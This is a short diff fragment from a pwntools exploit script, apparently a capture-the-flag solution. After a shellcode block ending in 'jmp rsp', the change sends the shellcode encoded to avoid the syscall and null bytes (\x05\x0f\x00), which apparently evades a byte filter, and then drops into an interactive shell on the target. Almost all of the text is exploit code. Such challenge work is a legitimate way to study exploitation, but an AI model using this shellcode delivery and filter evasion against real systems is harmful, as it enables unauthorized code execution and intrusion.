@@ -23,7 +23,7 @@ jmp rsp
 ''', arch = 'amd64')
 
 r.recv()
-#r.sendline(encoder.encode(shellcode, avoid='\x05\x0f\x00'))
-r.send(shellcode)
+r.sendline(encoder.encode(shellcode, avoid=b'\x05\x0f\x00'))
+#r.send(shellcode)
 
 r.interactive()
